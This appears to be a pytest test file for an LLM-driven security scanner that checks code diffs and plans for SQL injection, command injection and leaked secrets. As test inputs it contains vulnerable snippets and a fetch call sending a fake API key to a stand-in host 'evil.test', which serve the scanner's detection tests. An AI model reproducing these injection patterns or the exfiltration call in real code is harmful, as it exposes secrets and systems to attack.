import json
import pytest
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
from sqlalchemy import select

from sentinel_worker.models import Base, Edge, Finding, Node
from sentinel_worker.scan import parse_unified_diff, review_plan, scan_diff, trace_event
from sentinel_worker.sast import LLMNotConfiguredError
from sentinel_worker.agent import ToolCallEvent
from tests.conftest import MockLLMClient


# ── helpers ──────────────────────────────────────────────────────────────────

def _make_engine():
    return create_async_engine("sqlite+aiosqlite:///:memory:")


async def _db_session(engine):
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    return async_sessionmaker(engine, expire_on_commit=False)


def _finding_llm(vuln_type="sqli", severity="high", node_id="fn:app.js:query"):
    """Mock LLM that emits one finding via emit_finding tool."""
    async def _tool_dispatcher_echo(tool_name, tool_input):
        return {"data": tool_input}

    class _FindingLLM:
        async def call_with_tools(self, *, tool_dispatcher, **kwargs):
            result = await tool_dispatcher("emit_finding", {
                "vuln_type": vuln_type,
                "severity": severity,
                "title": f"Test {vuln_type}",
                "description": "desc",
                "remediation": "fix it",
                "node_id": node_id,
                "taint_path": [f"param:app.js:id", node_id],
            })
            yield ToolCallEvent(type="tool_call", tool_name="emit_finding", tool_input={}, result=result)

    return _FindingLLM()


# ── SAST requires LLM ─────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_scan_diff_raises_when_no_llm_configured():
    """scan_diff must raise LLMNotConfiguredError — no silent fallback."""
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            with pytest.raises(LLMNotConfiguredError):
                await scan_diff(session, "repo", "+++ b/app.js\n+db.query(`select * from t where id=${req.id}`)")


@pytest.mark.asyncio
async def test_scan_diff_emits_sql_injection_finding_via_llm():
    """SAST findings come from the LLM agent, not pattern matching."""
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run = await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+db.query(`select * from users where id=${req.query.id}`)",
                _llm=_finding_llm(vuln_type="sqli"),
            )
        async with session.begin():
            finding = await session.scalar(select(Finding).where(Finding.vuln_type == "sqli"))

    assert run.status == "completed"
    assert finding is not None
    assert finding.vuln_type == "sqli"
    assert finding.severity == "high"


@pytest.mark.asyncio
async def test_scan_diff_with_no_op_llm_produces_no_sast_findings():
    """An LLM that calls no tools → zero SAST findings (but secret scan still runs)."""
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run = await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+console.log('hello')",
                _llm=MockLLMClient(),
            )
        async with session.begin():
            findings = list(await session.scalars(select(Finding)))

    assert run.status == "completed"
    assert findings == []


# ── Graph construction ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_scan_diff_populates_context_graph():
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+app.get('/u', (req,res)=> db.query(`select * from users where id=${req.query.id}`))",
                _llm=MockLLMClient(),
            )
        async with session.begin():
            route = await session.get(Node, "route:app.js:GET /u")
            flow = await session.scalar(select(Edge).where(Edge.kind == "FLOWS_TO"))

    assert route is not None
    assert route.is_entry_point is True
    assert flow is not None


# ── Secret scan (pattern-based, not LLM) ─────────────────────────────────────

@pytest.mark.asyncio
async def test_secret_severity_reflects_exfiltration_sink():
    """Secrets flowing to HTTP sinks get severity=critical via pattern analysis."""
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})",
                _llm=MockLLMClient(),
            )
        async with session.begin():
            finding = await session.scalar(select(Finding).where(Finding.vuln_type == "secret_leak"))

    assert finding is not None
    assert finding.severity == "critical"


# ── Diff parsing ──────────────────────────────────────────────────────────────

def test_parse_unified_diff_collects_added_lines():
    files = parse_unified_diff("diff --git a/a b/a\n+++ b/a.py\n+print('x')\n unchanged")
    assert files[0].path == "a.py"
    assert "print" in files[0].content


# ── Trace events ──────────────────────────────────────────────────────────────

def test_trace_event_scrubs_nested_secret_fields_without_scrubbing_uuid():
    run_id = "123e4567-e89b-12d3-a456-426614174000"
    secret = "sk-Test_1234567890abcdefghijklmnop/QRSTUV"
    event = json.loads(trace_event("demo", run_id=run_id, nested={"token": secret}))
    assert event["run_id"] == run_id
    assert event["nested"]["token"] == "[REDACTED:high_entropy]"


@pytest.mark.asyncio
async def test_scan_trace_reports_blast_radius_and_adapter_coverage():
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run = await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+app.get('/u', (req,res)=> res.json({ok:true}))",
                _llm=MockLLMClient(),
            )

    events = [json.loads(line) for line in run.trace.splitlines()]
    graph_update = next(e for e in events if e["kind"] == "graph_update.completed")
    coverage = next(e for e in events if e["kind"] == "adapter.coverage")
    assert graph_update["changed_files"] == 1
    assert graph_update["blast_radius_files"] == 1
    assert coverage["matched_files"] == ["app.js"]
    assert coverage["unmatched_files"] == []


@pytest.mark.asyncio
async def test_scan_trace_records_diff_scope_metadata():
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run = await scan_diff(
                session,
                "repo",
                "+++ b/app.js\n+console.log('x')",
                run_context="ci",
                base_ref="origin/main",
                paths=["app.js"],
                _llm=MockLLMClient(),
            )

    started = json.loads(run.trace.splitlines()[0])
    assert started["kind"] == "scan.started"
    assert started["run_context"] == "ci"
    assert started["base_ref"] == "origin/main"
    assert started["paths"] == ["app.js"]


# ── Plan review (LLM-driven) ──────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_review_plan_raises_when_no_llm_configured():
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            with pytest.raises(LLMNotConfiguredError):
                await review_plan(session, "repo", "Add endpoint that runs exec(req.query.cmd)")


@pytest.mark.asyncio
async def test_review_plan_with_no_op_llm_completes_with_no_findings():
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run, findings = await review_plan(
                session,
                "repo",
                "Add safe endpoint that returns static data",
                _llm=MockLLMClient(),
            )

    assert run.status == "completed"
    assert findings == []
    events = [json.loads(line) for line in run.trace.splitlines()]
    assert any(e["kind"] == "plan.completed" for e in events)


@pytest.mark.asyncio
async def test_review_plan_with_retry_runs_multiple_passes():
    """With --with-retry, multiple passes run until no new findings."""
    engine = _make_engine()
    sm = await _db_session(engine)
    async with sm() as session:
        async with session.begin():
            run, findings = await review_plan(
                session,
                "repo",
                "Add endpoint",
                with_retry=True,
                _llm=MockLLMClient(),  # no-op LLM → no findings → stabilizes after 1 pass
            )

    events = [json.loads(line) for line in run.trace.splitlines()]
    passes = [e for e in events if e["kind"] == "plan.pass.completed"]
    # No findings → stabilises immediately (1 pass, no new FPs)
    assert len(passes) == 1
    assert findings == []


@pytest.mark.asyncio
async def test_review_plan_with_retry_emits_findings_from_llm():
    """LLM that emits a finding on first pass; second pass sees no new FPs → stabilises."""
    engine = _make_engine()
    sm = await _db_session(engine)

    call_count = 0

    class _OnceFindings:
        async def call_with_tools(self, *, tool_dispatcher, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                result = await tool_dispatcher("emit_finding", {
                    "vuln_type": "cmdi",
                    "severity": "critical",
                    "title": "Command injection",
                    "description": "desc",
                    "remediation": "fix",
                    "node_id": "fn:plan.txt:exec",
                    "taint_path": ["param:plan.txt:cmd", "fn:plan.txt:exec"],
                })
                yield ToolCallEvent(type="tool_call", tool_name="emit_finding", tool_input={}, result=result)

    async with sm() as session:
        async with session.begin():
            run, findings = await review_plan(
                session,
                "repo",
                "Add endpoint that runs exec(req.query.cmd)",
                with_retry=True,
                _llm=_OnceFindings(),
            )

    assert len(findings) == 1
    assert findings[0].vuln_type == "cmdi"
    events = [json.loads(line) for line in run.trace.splitlines()]
    passes = [e for e in events if e["kind"] == "plan.pass.completed"]
    assert len(passes) == 2  # pass 1: 1 new finding; pass 2: 0 new → stabilised
